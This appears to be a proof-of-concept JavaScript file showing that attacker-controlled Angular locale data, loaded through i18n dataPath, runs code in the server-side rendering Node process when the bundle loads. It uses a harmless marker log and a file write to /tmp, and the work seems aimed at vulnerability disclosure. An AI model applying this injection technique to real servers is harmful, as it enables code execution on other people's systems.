globalThis.$localize=Object.assign(globalThis.$localize || {},{locale:"xx"});
// Attacker-controlled locale data (lands via i18n.locales[locale].dataPath -> loadLocaleData)
const __attacker = globalThis.__attacker = globalThis.__attacker || {};
__attacker.loaded = (__attacker.loaded || 0) + 1;
console.log('[ATTACKER-EXEC] marker=SSR-VENUE-7f3c1e load-count=' + __attacker.loaded + ' ts=' + Date.now());
// side effect: touch a file the attacker would target in a real scenario
try {
  require('node:fs').writeFileSync('/tmp/ssr-venue/attacker-side-effect.txt', 'pwned-by-locale-data\n');
} catch {};

// --- generated legacy-SSR server bundle (main.js shape) ---
// AngularNodeAppEngine-style request loop stub
const http = require('node:http');
const server = http.createServer((req, res) => {
  // request-time rendering path — the prepended locale-data statements execute HERE
  res.writeHead(200, { 'content-type': 'text/html' });
  res.end('<!doctype html><html><body>rendered ' + (req.url || '/') + '</body></html>');
});
server.listen(0, () => {
  const port = server.address().port;
  console.log('[SSR] listening on ' + port);
  http.get('http://127.0.0.1:' + port + '/', () => {
    http.get('http://127.0.0.1:' + port + '/route-b', () => {
      server.close();
      console.log('[SSR] two requests served — attacker locale-data executed in the SSR Node process at bundle load (module top-level, boot-time; see ATTACKER-EXEC line above)');
      process.exit(0);
    });
  });
});
